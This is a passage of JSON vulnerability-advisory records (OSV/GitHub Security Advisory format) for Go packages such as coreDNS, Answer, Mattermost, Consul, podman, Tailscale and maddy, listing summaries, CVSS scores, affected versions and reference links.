"https://github.com/fkie-cad/yapscan/commit/242b4b25b107deacddd4ca276b45d23e16bb3b88"}, {"type": "WEB", "url": "https://github.com/fkie-cad/yapscan/commit/65f277662c6475eb3f592e0e4fdfee902ecd9326"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-69cg-p879-7622"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-ppp9-7jff-5vj2"}, {"type": "PACKAGE", "url": "https://github.com/fkie-cad/yapscan"}, {"type": "WEB", "url": "https://github.com/fkie-cad/yapscan/releases/tag/v0.19.2"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-03T23:05:28Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-h828-v5pv-33qx", "modified": "2023-03-14T19:39:27Z", "published": "2023-03-03T18:30:27Z", "aliases": ["CVE-2022-2837"], "summary": "coreDNS vulnerable to Improper Restriction of Communication Channel to Intended Endpoints", "details": "A flaw was found in coreDNS. This flaw allows a malicious user to redirect traffic intended for external top-level domains (TLD) to a pod they control by creating projects and namespaces that match the TLD.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/coredns/coredns"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.9.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2837"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2118543"}, {"type": "PACKAGE", "url": "https://github.com/coredns/coredns"}], "database_specific": {"cwe_ids": ["CWE-601", "CWE-923"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-06T21:43:07Z", "nvd_published_at": "2023-03-03T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9v4v-9fj5-p982", "modified": "2023-03-13T15:32:32Z", "published": "2023-03-07T09:30:30Z", "aliases": ["CVE-2023-1237"], "summary": "Answer vulnerable to Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1237"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/0566894a2c0e13cf07d877f41467e2e21529fee8"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/cc2aa618-05da-495d-a5cd-51c40557d481"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-08T17:11:57Z", "nvd_published_at": "2023-03-07T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3hwm-922r-47hw", "modified": "2023-04-25T23:06:52Z", "published": "2023-03-31T19:33:44Z", "aliases": [], "summary": "Stud42 vulnerable to denial of service", "details": "A security vulnerability has been identified in the GraphQL parser used by the API of s42.app. An attacker can overload the parser and cause the API pod to crash. With a bit of threading, the attacker can bring down the entire API, resulting in an unhealthy stream. This vulnerability can be exploited by sending a specially crafted request to the API with a large payload.\n\nAn attacker can exploit this vulnerability to cause a denial of service (DoS) attack on the s42.app API, resulting in unavailability of the API for legitimate users.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "atomys.codes/stud42"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.23.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/42Atomys/stud42/security/advisories/GHSA-3hwm-922r-47hw"}, {"type": "WEB", "url": "https://github.com/42Atomys/stud42/issues/412"}, {"type": "WEB", "url": "https://github.com/42Atomys/stud42/commit/a70bfc72fba721917bf681d72a58093fb9deee17"}, {"type": "PACKAGE", "url": "https://github.com/42Atomys/stud42"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-31T19:33:44Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-ff27-hrmr-ggpj", "modified": "2023-03-13T15:32:43Z", "published": "2023-03-07T09:30:30Z", "aliases": ["CVE-2023-1241"], "summary": "Answer vulnerable to Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1241"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/90bfa0dcc7b49482f1d1e31aee3ab073f3c13dd9"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/e0e9b1bb-3025-4b9f-acb4-16a5da28aa3c"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-08T17:09:59Z", "nvd_published_at": "2023-03-07T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vxhr-p2vp-7gf8", "modified": "2023-03-13T15:32:36Z", "published": "2023-03-07T09:30:30Z", "aliases": ["CVE-2023-1239"], "summary": "Answer vulnerable to Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Reflected in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1239"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/9870ed87fb24ed468aaf1e169c2d028e0f375106"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/3a22c609-d2d8-4613-815d-58f5990b8bd8"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-08T17:11:18Z", "nvd_published_at": "2023-03-07T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-58g2-vgpg-335q", "modified": "2023-04-07T22:47:43Z", "published": "2023-03-31T21:30:39Z", "aliases": ["CVE-2023-27163"], "summary": "request-baskets vulnerable to Server-Side Request Forgery", "details": "request-baskets up to v1.2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /api/baskets/{name}. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/darklynx/request-baskets"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.2.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27163"}, {"type": "WEB", "url": "https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3"}, {"type": "PACKAGE", "url": "https://github.com/darklynx/request-baskets"}, {"type": "WEB", "url": "https://notes.sjtu.edu.cn/s/MUUhEymt7"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/174128/Request-Baskets-1.2.1-Server-Side-Request-Forgery.html"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/174129/Maltrail-0.53-Remote-Code-Execution.html"}, {"type": "WEB", "url": "http://request-baskets.com"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-31T22:44:28Z", "nvd_published_at": "2023-03-31T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-63f2-6959-2pxj", "modified": "2023-04-07T21:09:25Z", "published": "2023-03-31T12:30:16Z", "aliases": ["CVE-2023-1776"], "summary": "Mattermost vulnerable to cross-site scripting (XSS)", "details": "Boards in Mattermost allows an attacker to upload a malicious SVG image file as an attachment to a card and share it using a direct link to the file. \n\n[Issue Identifier](https://mattermost.com/security-updates/): MMSA-2023-00139", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.0.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 6.7.2"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.7.0"}, {"fixed": "7.7.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.7.1"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.1.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.1.5"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.8.0"}, {"fixed": "7.8.1"}]}], "versions": ["7.8.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v5"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "5.0.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 5.39.3"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.3.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 4.10.10"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1776"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost-server"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-07T21:09:25Z", "nvd_published_at": "2023-03-31T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wj6x-hcc2-f32j", "modified": "2023-09-20T17:41:13Z", "published": "2023-03-09T18:30:30Z", "aliases": ["CVE-2023-0845"], "summary": "Consul Server Panic when Ingress and API Gateways Configured with Peering Connections", "details": "A vulnerability was identified in Consul and Consul Enterprise (\u201cConsul\u201d) an authenticated user with service:write permissions could trigger a workflow that causes Consul server and client agents to crash under certain circumstances. To exploit this vulnerability, an attacker requires access to an ACL token with service:write permissions, and there needs to be at least one running ingress or API gateway that is configured to route traffic to an upstream service.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.14.0"}, {"fixed": "1.14.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0845"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-06-consul-server-panic-when-ingress-and-api-gateways-configured-with-peering-connections/51197"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LYZOKMMVX4SIEHPJW3SJUQGMO5YZCPHC/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XNF4OLYZRQE75EB5TW5N42FSXHBXGWFE/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZTE4ITXXPIWZEQ4HYQCB6N6GZIMWXDAI/"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-16T16:04:18Z", "nvd_published_at": "2023-03-09T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g44v-6qfm-f6ch", "modified": "2023-03-27T22:10:58Z", "published": "2023-03-21T06:30:17Z", "aliases": ["CVE-2023-1539"], "summary": "Answer has Guessable CAPTCHA", "details": "Guessable CAPTCHA in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1539"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/813ad0b9894673b1bdd489a2e9ab60a44fe990af"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/b4df67f4-14ea-4051-97d4-26690c979a28"}], "database_specific": {"cwe_ids": ["CWE-307", "CWE-804"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-21T22:32:31Z", "nvd_published_at": "2023-03-21T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qwqv-rqgf-8qh8", "modified": "2023-04-04T15:30:26Z", "published": "2023-03-27T21:30:26Z", "aliases": ["CVE-2023-0778"], "summary": "Podman Time-of-check Time-of-use (TOCTOU) Race Condition", "details": "A Time-of-check Time-of-use (TOCTOU) flaw was found in podman. This issue may allow a malicious user to replace a normal file in a volume with a symlink while exporting the volume, allowing for access to arbitrary files on the host file system.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/podman/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.4.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0778"}, {"type": "WEB", "url": "https://github.com/containers/podman/pull/17528"}, {"type": "WEB", "url": "https://github.com/containers/podman/pull/17532"}, {"type": "WEB", "url": "https://github.com/containers/podman/commit/6ca857feb07a5fdc96fd947afef03916291673d8"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2023-0778"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2168256"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-qwqv-rqgf-8qh8"}, {"type": "PACKAGE", "url": "https://github.com/containers/podman"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1681"}], "database_specific": {"cwe_ids": ["CWE-367"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-27T22:33:20Z", "nvd_published_at": "2023-03-27T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h2wg-83fc-xvm9", "modified": "2023-03-27T22:10:46Z", "published": "2023-03-21T06:30:17Z", "aliases": ["CVE-2023-1541"], "summary": "Answer vulnerable to Business Logic Errors", "details": "Business Logic Errors in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1541"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/15390adbfcd5fd37af4661f992f8873ae5a6b840"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/8fd891c6-b04e-4dac-818f-9ea30861cd92"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-03-21T22:32:42Z", "nvd_published_at": "2023-03-21T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ch9g-x9j7-rcgp", "modified": "2023-03-24T16:21:55Z", "published": "2023-03-19T18:30:24Z", "aliases": ["CVE-2023-1496"], "summary": "imgproxy Cross-site Scripting vulnerability", "details": "Cross-site Scripting (XSS) - Reflected in GitHub repository imgproxy/imgproxy prior to 3.14.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/imgproxy/imgproxy/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.14.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1496"}, {"type": "WEB", "url": "https://github.com/imgproxy/imgproxy/commit/62f8d08a93d301285dcd1dabcc7ba10c6c65b689"}, {"type": "PACKAGE", "url": "https://github.com/imgproxy/imgproxy"}, {"type": "WEB", "url": "https://huntr.dev/bounties/de603972-935a-401a-96fb-17ddadd282b2"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-20T21:13:37Z", "nvd_published_at": "2023-03-19T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h85v-cx5m-78wj", "modified": "2023-03-13T15:35:01Z", "published": "2023-03-07T09:30:29Z", "aliases": ["CVE-2023-1244"], "summary": "Answer vulnerable to Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1244"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/9870ed87fb24ed468aaf1e169c2d028e0f375106"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/bcab9555-8a35-42b2-a7de-0a79fd710b52"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-08T17:02:42Z", "nvd_published_at": "2023-03-07T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vfgq-g5x8-g595", "modified": "2023-03-23T22:09:19Z", "published": "2023-03-23T19:58:23Z", "aliases": ["CVE-2023-28436"], "summary": "Non-interactive Tailscale SSH sessions on FreeBSD may use the effective group ID of the tailscaled process", "details": "A vulnerability identified in the implementation of Tailscale SSH in FreeBSD allowed commands to be run with a higher privilege group ID than that specified by Tailscale SSH access rules.\n\n**Affected platforms**: FreeBSD\n\n**Patched Tailscale client versions**: v1.38.2 or later\n\n### What happened?\nA difference in the behavior of the FreeBSD `setgroups` system call from POSIX meant that the Tailscale client running on a FreeBSD-based operating system did not appropriately restrict groups on the host when using Tailscale SSH. When accessing a FreeBSD host over Tailscale SSH, the egid of the tailscaled process was used instead of that of the user specified in Tailscale SSH access rules.\n\n### Who is affected?\n9 tailnets with 22 FreeBSD nodes running Tailscale SSH since Tailscale v1.34 (released on 2022-12-04) may have had Tailscale SSH sessions with a higher privilege group ID than that specified in Tailscale SSH access rules.\n\nWe have notified the affected organizations where we have [security contacts](https://tailscale.com/kb/1224/contact-preferences/#setting-the-security-issues-email).\n\n### What is the impact?\nTailscale SSH commands may have been run with a higher privilege group ID than that specified in Tailscale SSH access rules if they met all of the following criteria:\n* The destination node was a FreeBSD device with Tailscale SSH enabled;\n* Tailscale SSH access rules permitted access for non-root users; and\n* A non-interactive SSH session was used.\n\n### What do I need to do?\nIf you are running Tailscale on FreeBSD, upgrade to v1.38.2 or later to remediate the issue. Admins of a tailnet can view [FreeBSD nodes with unpatched versions](https://login.tailscale.com/admin/machines?q=version%3A%3C1.38.2+freebsd) in the admin console.\n\nTo update the local ports tree in advance of what's available upstream, you can:\n\n1. `cd /usr/ports/security/tailscale`\n2. edit the Makefile to set `PORTVERSION` to `1.38.2`\n3. `make makesum`\n4. `make install`\n\nTailscale SSH on other platforms is not affected.\n\n### Credits\nWe would like to thank [Ryan Belgrave](https://www.linkedin.com/in/rbelgrave/) for reporting this issue.\n\n### References\n* [TS-2023-003](https://tailscale.com/security-bulletins/#ts-2023-003)\n\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:A/AC:L/PR:H/UI:R/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "tailscale.com"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.34.0"}, {"fixed": "1.38.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/tailscale/tailscale/security/advisories/GHSA-vfgq-g5x8-g595"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28436"}, {"type": "WEB", "url": "https://github.com/tailscale/tailscale/commit/d00c046b723dff6e3775d7d35f891403ac21a47d"}, {"type": "PACKAGE", "url": "https://github.com/tailscale/tailscale"}, {"type": "WEB", "url": "https://github.com/tailscale/tailscale/releases/tag/v1.38.2"}, {"type": "WEB", "url": "https://tailscale.com/security-bulletins/#ts-2023-003"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-23T19:58:23Z", "nvd_published_at": "2023-03-23T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vfvj-3m3g-m532", "modified": "2023-03-13T20:53:50Z", "published": "2023-03-13T20:53:50Z", "aliases": ["CVE-2023-27483"], "summary": "fieldpath's Paved.SetValue allows growing arrays up to arbitrary sizes in crossplane-runtime", "details": "### Summary\n\nFuzz testing on `crossplane/crossplane`, by Ada Logics and sponsored by the CNCF, identified input to a function in the `fieldpath` package that can cause an out of memory panic. Applications that use the `Paved` type's `SetValue` method with user provided input without proper validation might use excessive amounts of memory and cause an out of memory panic.\n\n### Details\n\nIn the `fieldpath` package, the `SetValue` method of the `Paved` type sets a value on the inner object according to the provided path, without validating it first. This allows setting values in slices at any specific index and the code will grow the target array up to the required size. The index is currently capped at max uint32 (4294967295) given how indexes are parsed,  but that is still an unnecessarily large value.\n\n### Workaround\n\nUsers can parse and validate the path before passing it to the `SetValue` method of the `Paved` type, constraining the index size as deemed appropriate.\n\n### Credits\n\nDisclosed by Ada Logics in a fuzzing audit sponsored by CNCF.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/crossplane/crossplane-runtime"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.17.0"}, {"fixed": "0.19.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/crossplane/crossplane-runtime"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.6.0"}, {"fixed": "0.16.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/crossplane/crossplane-runtime/security/advisories/GHSA-vfvj-3m3g-m532"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27483"}, {"type": "WEB", "url": "https://github.com/crossplane/crossplane-runtime/commit/53508a9f4374604db140dd8ab2fa52276441e738"}, {"type": "WEB", "url": "https://github.com/crossplane/crossplane-runtime/commit/f67177024d906aaf5e13ee7cd470b4e87a9fef40"}, {"type": "PACKAGE", "url": "https://github.com/crossplane/crossplane-runtime"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1623"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-13T20:53:50Z", "nvd_published_at": "2023-03-09T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6x5v-cxpp-pc5x", "modified": "2023-03-23T19:10:59Z", "published": "2023-03-21T06:30:17Z", "aliases": ["CVE-2023-1540"], "summary": "Answer has Observable Response Discrepancy", "details": "Observable Response Discrepancy in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1540"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/1de3ec27e50ba7389c9449c59e8ea3a37a908ee4"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/d8d6c259-a0f2-4209-a3b0-ecbf3eb092f4"}], "database_specific": {"cwe_ids": ["CWE-203", "CWE-204"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-21T22:32:37Z", "nvd_published_at": "2023-03-21T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4g76-w3xw-2x6w", "modified": "2023-03-14T18:03:22Z", "published": "2023-03-14T18:03:22Z", "aliases": ["CVE-2023-27582"], "summary": "Full authentication bypass if SASL authorization username is specified", "details": "### Impact\n\nmaddy 0.2.0 - 0.6.2 allows a full authentication bypass if SASL authorization username is specified when using the PLAIN authentication mechanisms. Instead of validating the specified authorization username, it is accepted as is after checking the credentials for the authentication username.\n\n### Patches\n\nmaddy 0.6.3 includes the fix for the bug. \n\n### Workarounds\n\nThere is no way to fix the issue without upgrading.\n\n### References\n\n* Commit that introduced the vulnerable code: https://github.com/foxcpp/maddy/commit/55a91a37b71210f34f98f4d327c30308fe24399a\n* Fix: https://github.com/foxcpp/maddy/commit/9f58cb64b39cdc01928ec463bdb198c4c2313a9c\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/foxcpp/maddy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.2.0"}, {"fixed": "0.6.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/foxcpp/maddy/security/advisories/GHSA-4g76-w3xw-2x6w"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27582"}, {"type": "WEB", "url": "https://github.com/foxcpp/maddy/commit/55a91a37b71210f34f98f4d327c30308fe24399a"}, {"type": "WEB", "url": "https://github.com/foxcpp/maddy/commit/9f58cb64b39cdc01928ec463bdb198c4c2313a9c"}, {"type": "PACKAGE", "url": "https://github.com/foxcpp/maddy"}, {"type": "WEB", "url": "https://github.com/foxcpp/maddy/releases/tag/v0.6.3"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-03-14T18:03:22Z", "nvd_published_at": "2023-03-13T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qrwm-xqfr-4vhv", "modified": "2023-03-13T15:32:57Z", "published": "2023-03-07T09:30:30Z", "aliases": ["CVE-2023-1242"], "summary": "Answer vulnerable to Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1242"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/90bfa0dcc7b49482f1d1e31aee3ab073f3c13dd9"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/71c24c5e-ceb2-45cf-bda7-fa195d37e289"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-08T17:03:10Z", "nvd_published_at": "2023-03-07T08:15:00Z"}}, {"schema_version": "1.4.0", "id": 